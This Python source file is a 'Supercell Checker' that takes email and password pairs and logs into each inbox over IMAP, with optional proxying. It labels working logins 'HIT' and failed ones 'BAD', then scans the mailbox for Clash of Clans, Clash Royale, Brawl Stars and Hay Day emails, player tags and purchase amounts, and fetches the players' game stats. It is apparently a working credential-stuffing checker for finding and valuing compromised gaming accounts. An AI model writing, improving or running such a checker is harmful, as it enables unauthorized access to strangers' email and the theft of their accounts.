"""
Supercell Checker — IMAP inbox + Supercell public APIs.
Fixed: APIs need no Bearer token (public), correct tag URL encoding,
       proper email body parsing for purchase history.
"""
import re
import logging
import email as email_lib
from typing import Dict, List, Optional
from ._imap_utils import imap_connect, get_email_body, basic_auth_works

try:
    import requests
    _has_requests = True
except ImportError:
    _has_requests = False

logger = logging.getLogger(__name__)

# Public APIs — no auth required for player lookup by tag
COC_API = 'https://cocproxy.royaleapi.dev/v1'  # RoyaleAPI proxy (no token needed)
CR_API  = 'https://proxy.royaleapi.dev/v1'     # RoyaleAPI proxy (no token needed)
BS_API  = 'https://api.brawlapi.com/v1'        # BrawlAPI (no auth)


def _encode_tag(tag: str) -> str:
    """Encode Supercell player tag for URL (# → %23)."""
    return tag.replace('#', '%23').upper()


class SupercellChecker:
    def __init__(self, timeout: int = 20, proxy: str = None):
        self.timeout = timeout
        self.proxy   = proxy
        self.proxies = {'http': proxy, 'https': proxy} if proxy else None
        if _has_requests:
            self.session = requests.Session()
            self.session.headers.update({
                'User-Agent': 'Mozilla/5.0 (Linux; Android 13) AppleWebKit/537.36',
                'Accept':     'application/json',
            })

    def _kw(self) -> dict:
        k = {'timeout': self.timeout}
        if self.proxies:
            k['proxies'] = self.proxies
        return k

    def _search_inbox(self, email: str, password: str) -> Dict:
        result = {
            'inbox_accessible': False, 'total_sc_emails': 0,
            'coc_emails': 0, 'coc_tags': [],
            'cr_emails':  0, 'cr_tags':  [],
            'bs_emails':  0, 'bs_tags':  [],
            'hd_emails':  0,
            'sc_id_connected': False,
            'purchase_history': [], 'total_spent': 0.0,
        }

        # Skip providers that won't work with basic auth
        if not basic_auth_works(email):
            return result

        imap = imap_connect(email, password, self.timeout)
        if not imap:
            return result

        result['inbox_accessible'] = True
        try:
            imap.select('INBOX', readonly=True)
            searches = {
                'supercell': 'FROM "supercell.com"',
                'coc_subj':  'SUBJECT "Clash of Clans"',
                'cr_subj':   'SUBJECT "Clash Royale"',
                'bs_subj':   'SUBJECT "Brawl Stars"',
                'hd_subj':   'SUBJECT "Hay Day"',
                'sc_id':     'FROM "id.supercell.com"',
            }
            ids_map: Dict[str, set] = {}
            for key, criteria in searches.items():
                try:
                    st, data = imap.search(None, criteria)
                    ids_map[key] = set(data[0].split()) if (st == 'OK' and data[0]) else set()
                except Exception:
                    ids_map[key] = set()

            result['total_sc_emails'] = len(ids_map.get('supercell', set()))
            result['coc_emails']      = len(ids_map.get('coc_subj',  set()))
            result['cr_emails']       = len(ids_map.get('cr_subj',   set()))
            result['bs_emails']       = len(ids_map.get('bs_subj',   set()))
            result['hd_emails']       = len(ids_map.get('hd_subj',   set()))
            result['sc_id_connected'] = bool(ids_map.get('sc_id', set()))

            all_ids = ids_map.get('supercell', set()) | ids_map.get('coc_subj', set()) | ids_map.get('cr_subj', set())
            for eid in list(all_ids)[:15]:
                try:
                    st, msg_data = imap.fetch(eid, '(RFC822)')
                    if st != 'OK' or not msg_data or not msg_data[0]:
                        continue
                    raw_bytes = msg_data[0][1]
                    msg   = email_lib.message_from_bytes(raw_bytes)
                    body  = get_email_body(msg).lower()
                    raw_str = raw_bytes.decode('utf-8', errors='ignore')

                    # Tags are always uppercase #XXXXXXXX
                    tags = re.findall(r'#([A-Z0-9]{6,12})', raw_str)
                    for tag in set(tags):
                        full = f'#{tag}'
                        if 'clash of clans' in body and full not in result['coc_tags']:
                            result['coc_tags'].append(full)
                        elif 'clash royale' in body and full not in result['cr_tags']:
                            result['cr_tags'].append(full)
                        elif 'brawl' in body and full not in result['bs_tags']:
                            result['bs_tags'].append(full)

                    # Purchase amounts — look for currency patterns
                    for amt in re.findall(r'(?:USD|EUR|GBP)?\s*\$?\s*(\d+\.?\d{0,2})\s*(?:USD|EUR|GBP)?', body):
                        try:
                            val = float(amt)
                            if 0.5 <= val <= 200:  # sanity range
                                result['total_spent']      += val
                                result['purchase_history'].append(f'${val:.2f}')
                        except Exception:
                            pass
                except Exception:
                    continue
        finally:
            try:
                imap.logout()
            except Exception:
                pass
        return result

    def _api_get(self, url: str) -> Optional[Dict]:
        if not _has_requests:
            return None
        try:
            r = self.session.get(url, **self._kw())
            if r.status_code == 200:
                return r.json()
            if r.status_code == 404:
                return None  # tag not found
        except Exception as exc:
            logger.debug(f"api_get {url}: {exc}")
        return None

    def _lookup_coc(self, tag: str) -> Optional[Dict]:
        data = self._api_get(f"{COC_API}/players/{_encode_tag(tag)}")
        if not data:
            return None
        return {
            'name':          data.get('name'),
            'tag':           data.get('tag'),
            'townHallLevel': data.get('townHallLevel'),
            'trophies':      data.get('trophies'),
            'bestTrophies':  data.get('bestTrophies'),
            'expLevel':      data.get('expLevel'),
            'warStars':      data.get('warStars', 0),
            'clan':          data.get('clan', {}).get('name'),
            'league':        data.get('league', {}).get('name'),
        }

    def _lookup_cr(self, tag: str) -> Optional[Dict]:
        data = self._api_get(f"{CR_API}/players/{_encode_tag(tag)}")
        if not data:
            return None
        return {
            'name':         data.get('name'),
            'tag':          data.get('tag'),
            'trophies':     data.get('trophies'),
            'bestTrophies': data.get('bestTrophies'),
            'expLevel':     data.get('expLevel'),
            'arena':        data.get('arena', {}).get('name'),
            'clan':         data.get('clan', {}).get('name'),
            'wins':         data.get('wins'),
            'losses':       data.get('losses'),
        }

    def _lookup_bs(self, tag: str) -> Optional[Dict]:
        # BrawlAPI endpoint
        data = self._api_get(f"https://api.brawlapi.com/v1/players/{_encode_tag(tag)}")
        if not data:
            return None
        return {
            'name':             data.get('name'),
            'tag':              data.get('tag'),
            'trophies':         data.get('trophies'),
            'highestTrophies':  data.get('highestTrophies'),
            'expLevel':         data.get('expLevel'),
            'brawlersCount':    len(data.get('brawlers', [])),
            'club':             data.get('club', {}).get('name'),
            'soloVictories':    data.get('soloVictories'),
        }

    def check_full(self, email: str, password: str) -> Dict:
        result = {
            'email': email, 'password': password, 'status': 'BAD',
            'has_supercell':  False, 'sc_id_connected': False,
            'total_sc_emails':0,    'total_spent': 0.0,
            'coc': {'found': False, 'emails': 0, 'tags': [], 'players': []},
            'cr':  {'found': False, 'emails': 0, 'tags': [], 'players': []},
            'bs':  {'found': False, 'emails': 0, 'tags': [], 'players': []},
            'hd':  {'found': False, 'emails': 0},
            'games': [],
        }

        inbox = self._search_inbox(email, password)
        if not inbox['inbox_accessible']:
            result['status'] = 'BAD'
            return result

        result['status']           = 'HIT'
        result['sc_id_connected']  = inbox['sc_id_connected']
        result['total_sc_emails']  = inbox['total_sc_emails']
        result['total_spent']      = inbox['total_spent']

        for game_key, email_key, tag_key, label, lookup_fn in [
            ('coc', 'coc_emails', 'coc_tags', 'CoC', self._lookup_coc),
            ('cr',  'cr_emails',  'cr_tags',  'CR',  self._lookup_cr),
            ('bs',  'bs_emails',  'bs_tags',  'BS',  self._lookup_bs),
        ]:
            result[game_key]['emails'] = inbox[email_key]
            result[game_key]['tags']   = inbox[tag_key]
            if inbox[email_key] > 0 or inbox[tag_key]:
                result[game_key]['found'] = True
                result['has_supercell']   = True
                if label not in result['games']:
                    result['games'].append(label)
                for tag in inbox[tag_key][:3]:
                    player = lookup_fn(tag)
                    if player:
                        result[game_key]['players'].append(player)

        result['hd']['emails'] = inbox['hd_emails']
        if inbox['hd_emails'] > 0:
            result['hd']['found'] = True
            result['has_supercell'] = True
            if 'HD' not in result['games']:
                result['games'].append('HD')

        if not result['has_supercell'] and inbox['total_sc_emails'] > 0:
            result['has_supercell'] = True

        return result
